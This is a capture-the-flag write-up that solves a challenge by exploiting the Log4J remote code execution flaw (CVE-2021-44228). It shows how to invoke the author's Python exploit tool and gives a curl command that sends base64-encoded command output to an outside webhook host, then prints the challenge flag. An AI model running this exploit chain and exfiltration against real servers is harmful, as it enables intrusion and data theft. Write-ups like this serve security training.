# The Loggers Writeup

> Author: alexandre-lavoie

From the numerous amounts of mentions of Log - it should be assumed that we are dealing with the latest Log4J RCE [CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228). Given the disclosure is very recent, there is a fair bit of security analysis but not many clean solutions. I wrote a payload with Python [here](https://github.com/alexandre-lavoie/python-log4rce). 

The payloads will follow this structure:

```
python3 log4rce.py --rhosts "YOUR_IP" --target "linux" --payload "PAYLOAD" http -X POST --url "URL" --data "address=###"
```

We can use try to CURL to see if we can extract data:

```
curl http://webhook.site/...
```

Which will give us a reply. We can use the following to run commands and get the output in base64:

```
curl -X POST -d "data=$(PAYLOAD | base64)" http://webhook.site/...
```

If we run `ls`, we find that there is a `flag.txt`. We can use `cat flag.txt` to get flag:

```
FLAG-{must_p4tch_cve-2021-44228}
```
